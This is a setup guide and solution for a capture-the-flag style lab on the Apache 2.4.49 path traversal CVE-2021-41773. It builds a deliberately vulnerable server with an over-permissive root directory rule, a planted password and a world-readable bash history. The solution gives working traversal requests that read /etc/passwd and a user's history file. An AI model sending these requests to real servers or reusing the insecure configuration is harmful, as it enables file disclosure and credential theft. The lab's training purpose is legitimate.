# CVE-2021-41773 (apache)

Download VM: todo
* Credentials: ```user/user```, ```root/123456```
* SSH disabled
* Debian 11, 2 GB disk

# Agenda

In this work, you have to gain access to what you should not have access to ... Well, or at least find out the title of the new classified materials.

# Setup

*Requirements:*  **2 GB** of disk space for VM.

```bash
sudo apt-get update --allow-releaseinfo-change
sudo apt-get install libapr1-dev libaprutil1-dev libpcre3 libpcre3-dev gcc make autoconf wget 
```

Compile and install httpd

```
wget http://archive.apache.org/dist/httpd/httpd-2.4.49.tar.gz
tar -xzf httpd-2.4.49.tar.gz
cd httpd-2.4.49
./configure --enable-cgi
make 
sudo make install
rm -rf ~/httpd-2.4.49
rm -f httpd-2.4.49.tar.gz
```

#### Configure Apache server

Edit **/usr/local/apache2/conf/httpd.conf**

```
sudo nano -c /usr/local/apache2/conf/httpd.conf
```

Find next configuration part:

```
<Directory "/usr/local/apache2/cgi-bin">
    AllowOverride None
    Options None
    Require all granted
</Directory>
```
Add next lines
```
<Directory />
        Require all granted
</Directory>
```

As result you'll will get something like:

```
<Directory "/usr/local/apache2/cgi-bin">
    AllowOverride None
    Options None
    Require all granted
</Directory>
<Directory />
        Require all granted
</Directory>
```



#### Apache service configuration

Change **/etc/systemd/system/httpd.service** (```sudo nano -c /etc/systemd/system/httpd.service```)

```
[Unit]
Description=The Apache HTTP Server

[Service]
Type=forking
ExecStart=/usr/local/apache2/bin/apachectl start
ExecReload=/usr/local/apache2/bin/apachectl graceful
ExecStop=/usr/local/apache2/bin/apachectl stop
PrivateTmp=true


[Install]
WantedBy=multi-user.target
```

Reload nginx config
```
sudo systemctl daemon-reload
sudo systemctl enable httpd
sudo systemctl start httpd
```

#### Uploading and configuring sources


Upload sources to **/usr/local/apache2/htdocs/**

- /usr/local/apache2/htdocs/index.html
- /usr/local/apache2/htdocs/admin/index.html
- /usr/local/apache2/htdocs/admin/Sup3rS3cr3t.html

Make admin folder password protected

```
sudo /usr/local/apache2/bin/htpasswd -c /usr/local/apache2/.htpasswd michael

###user password WUWJYVpX
```

Edit **/usr/local/apache2/conf/httpd.conf**

```
<Directory "/usr/local/apache2/htdocs/admin">
  AuthType Basic
  AuthName "Authentication Required"
  AuthUserFile "/usr/local/apache2/.htpasswd"
  Require valid-user
  Order allow,deny
  Allow from all

</Directory>
```



#### Create user and configure user

```
sudo adduser michael
##set password
```
Make few commands with michael

```
su michael
/usr/local/apache2/bin/htpasswd -c /usr/local/apache2/.htpasswd michael -p WUWJYVpX
exit
```

Make **/home/michael/.bash_history** readable

```
chmod 777 /home/michael/.bash_history
```


## How to check that everything works ?

1. Open the main page. You should see the working app. 


## Solution
https://nvd.nist.gov/vuln/detail/CVE-2021-41773

It's better to user **Burp Suite** to send requests 
1. Get all users from the server 
    ```
    GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd
    ```
2. Get Michael .bash_history and find his password
    ```
    GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/home/michael/.bash_history
    ```



